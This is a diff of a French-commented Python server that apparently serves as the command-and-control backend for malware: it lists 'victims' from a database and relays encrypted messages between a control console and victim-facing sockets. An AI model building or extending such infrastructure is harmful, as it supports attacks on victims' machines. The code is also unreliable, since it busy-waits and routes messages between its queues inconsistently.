@@ -8,6 +8,7 @@ import utile.data as data
 import utile.security as security
 import queue
 import threading
+import time
 
 main_queue = queue.Queue()
 front_thread_queue = queue.Queue()
@@ -15,21 +16,25 @@ console_thread_queue = queue.Queue()
 
 
 def get_data_from_db(message_console, conn):
+    global console_thread_queue
+    global front_thread_queue
+    global main_queue
     type_message = message.get_message_type(message_console)
     print("Type de message reçu : ", type_message)
     # Traiter le message reçu de type LIST_REQ
     if type_message == "LIST_REQ":
         victims = data.get_list_victims(conn)
-        print(victims)
         # Envoi de la réponse de type LIST_VICTIM_RESP (pour chaque victime)
         for victim in victims:
-            print(victim)
+
             message_response = message.set_message("LIST_RESP", victim)
+            # STOCKAGE DANS LA QUEUE DU THREAD DE CONSOLE
             console_thread_queue.put(message_response)
-            print("Contenu de la file d'attente console_thread_queue : ", message_response)
         # Envoi de la réponse de type LIST_VICTIM_END
-        message_response = message.set_message("LIST_END")
-        console_thread_queue.put(message_response)
+        message_end = message.set_message("LIST_END")
+        console_thread_queue.put(message_end)
+        # print la queue du thread de console
+        print(console_thread_queue.queue)
     # Traiter le message reçu de type HIST_REQ
     elif type_message == "HIST_REQ":
         victim_id = message_console["HIST_REQ"]
@@ -99,8 +104,11 @@ def get_data_from_db(message_console, conn):
 
 
 def handle_console(socket_server_console):
+    global console_thread_queue
+    global main_queue
     while True:
         client_socket, address = socket_server_console.accept()
+        print(client_socket, address)
         key = security.diffie_hellman_recv_key(client_socket)
         encrypted_message_console = network.receive_message(client_socket)
         if encrypted_message_console is not None:
@@ -109,25 +117,62 @@ def handle_console(socket_server_console):
         else:
             print("Message console reçu est None. Ignoré.")
 
+        # Récupérer les réponses de la file d'attente console_thread_queue et les renvoyer à la console de contrôle
+        while console_thread_queue.empty():
+            pass
+        else:
+            # Récupérer les messages de la file d'attente (un oar un) jusqu'au list_end ou hist_end et les envoyer à la console
+            while not console_thread_queue.empty():
+                message_console = console_thread_queue.get()
+                encrypted_message_console = security.aes_encrypt(message_console, key)
+                network.send_message(client_socket, encrypted_message_console)
+
+                # Si le message est de type LIST_END ou HIST_END, sortir de la boucle
+                if message.get_message_type(message_console) in ["LIST_END", "HIST_END"]:
+                    break
+
+
+
+
+
 
 def handle_frontal(socket_server_frontal):
+    global front_thread_queue
+    global main_queue
     while True:
         client_socket, address = socket_server_frontal.accept()
+        print(client_socket, address)
         key = security.diffie_hellman_recv_key(client_socket)
         encrypted_message_frontal = network.receive_message(client_socket)
         if encrypted_message_frontal is not None:
             message_frontal = security.aes_decrypt(encrypted_message_frontal, key)
-            front_thread_queue.put((message_frontal, client_socket, key))
+            main_queue.put((message_frontal, client_socket, key))
         else:
-            print("Message frontale reçu est None. Ignoré.")
+            print("Message frontal reçu est None. Ignoré.")
+
+        # Traiter les éléments de la file frontal_thread_queue
+        while not front_thread_queue.empty():
+            # Récupérer les messages de la file frontal_thread_queue et les traiter
+            message_frontal = front_thread_queue.get()
+            # Traitement des messages frontal ici
+            print("Message frontal : ", message_frontal)
+            # Envoi du message frontal à la victime
+            encrypted_message_frontal = security.aes_encrypt(message_frontal, key)
+            network.send_message(client_socket, encrypted_message_frontal)
+
+
 
 
 def main():
+    global console_thread_queue
+    global main_queue
+    global front_thread_queue
     socket_server_console = network.start_net_serv(port=8380)
     socket_server_frontal = network.start_net_serv(port=8381)
     conn = data.connect_db()
     if conn is not None:
         print("Base de données initialisée")
+
 
     console = threading.Thread(target=handle_console, args=(socket_server_console,))
     frontal = threading.Thread(target=handle_frontal, args=(socket_server_frontal,))
@@ -135,25 +180,16 @@ def main():
     console.start()
     frontal.start()
 
+    global main_queue
     while True:
-        if not main_queue.empty():
+        while not main_queue.empty():
+            # Traiter les éléments de la file
             message_console, client_socket, key = main_queue.get()
             get_data_from_db(message_console, conn)
-            while not console_thread_queue.empty():
-                message_response = console_thread_queue.get()
-                encrypted_response = security.aes_encrypt(message_response, key)
-                network.send_message(client_socket, encrypted_response)
-                print("Contenu de la file d'attente console_thread_queue : ", message_response)  # Ajout du print
 
-        if not front_thread_queue.empty():
-            message_frontal, client_socket, key = front_thread_queue.get()
-            get_data_from_db(message_frontal, conn)
-            while not console_thread_queue.empty():
-                message_response = console_thread_queue.get()
-                encrypted_response = security.aes_encrypt(message_response, key)
-                network.send_message(client_socket, encrypted_response)
-                print("Contenu de la file d'attente console_thread_queue : ", message_response)
+
 
 
 if __name__ == '__main__':
     main()
+
